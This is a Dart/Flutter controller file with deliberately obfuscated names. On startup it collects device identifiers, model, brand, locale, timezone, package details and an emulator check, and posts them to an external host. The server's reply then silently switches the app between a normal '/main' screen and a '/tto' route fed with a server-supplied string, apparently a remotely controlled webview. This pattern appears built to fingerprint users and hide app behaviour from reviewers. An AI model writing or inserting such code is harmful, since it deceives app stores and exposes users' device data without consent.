import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var inthbz = RxBool(false);
  var emqfhuiagl = RxBool(true);
  var ejku = RxString("");
  var susan = RxBool(false);
  var schaefer = RxBool(true);
  final jmwqzbsu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    horptj();
  }


  Future<void> horptj() async {

    susan.value = true;
    schaefer.value = true;
    emqfhuiagl.value = false;

    jmwqzbsu.post("https://avx.youting.life/esrhzjnqfcptiubymdkxawoglv",data: await zmljdofskq()).then((value) {
      var oiqxatj = value.data["oiqxatj"] as String;
      var mdsx = value.data["mdsx"] as bool;
      if (mdsx) {
        ejku.value = oiqxatj;
        kayla();
      } else {
        walter();
      }
    }).catchError((e) {
      emqfhuiagl.value = true;
      schaefer.value = true;
      susan.value = false;
    });
  }

  Future<Map<String, dynamic>> zmljdofskq() async {
    final DeviceInfoPlugin cfriowg = DeviceInfoPlugin();
    PackageInfo zrgnalh_jgbszri = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ovgsibpt = Platform.localeName;
    var hy_ZCi = currentTimeZone;

    var hy_sETvPz = zrgnalh_jgbszri.packageName;
    var hy_NxIjwFy = zrgnalh_jgbszri.version;
    var hy_oPwU = zrgnalh_jgbszri.buildNumber;

    var hy_ELCAyZ = zrgnalh_jgbszri.appName;
    var hy_ZuI  = "";
    var hy_JB = "";
    var hy_RkN = "";
    var yasmeenRunolfsson = "";
    var arvidOkuneva = "";
    var kendrickLeannon = "";
    var ocieGaylord = "";
    var willKuphal = "";


    var hy_euPLSB = "";
    var hy_nCBSgt = false;

    if (GetPlatform.isAndroid) {
      hy_euPLSB = "android";
      var cybmahuto = await cfriowg.androidInfo;

      hy_RkN = cybmahuto.brand;

      hy_JB  = cybmahuto.model;
      hy_ZuI = cybmahuto.id;

      hy_nCBSgt = cybmahuto.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hy_euPLSB = "ios";
      var uomdblxw = await cfriowg.iosInfo;
      hy_RkN = uomdblxw.name;
      hy_JB = uomdblxw.model;

      hy_ZuI = uomdblxw.identifierForVendor ?? "";
      hy_nCBSgt  = uomdblxw.isPhysicalDevice;
    }
    var res = {
      "yasmeenRunolfsson" : yasmeenRunolfsson,
      "hy_NxIjwFy": hy_NxIjwFy,
      "hy_sETvPz": hy_sETvPz,
      "hy_ELCAyZ": hy_ELCAyZ,
      "hy_JB": hy_JB,
      "ovgsibpt": ovgsibpt,
      "hy_oPwU": hy_oPwU,
      "hy_ZCi": hy_ZCi,
      "hy_RkN": hy_RkN,
      "hy_ZuI": hy_ZuI,
      "hy_euPLSB": hy_euPLSB,
      "arvidOkuneva" : arvidOkuneva,
      "hy_nCBSgt": hy_nCBSgt,
      "willKuphal" : willKuphal,
      "ocieGaylord" : ocieGaylord,
      "kendrickLeannon" : kendrickLeannon,

    };
    return res;
  }

  Future<void> walter() async {
    Get.offAllNamed("/main");
  }

  Future<void> kayla() async {
    Get.offAllNamed("/tto");
  }

}
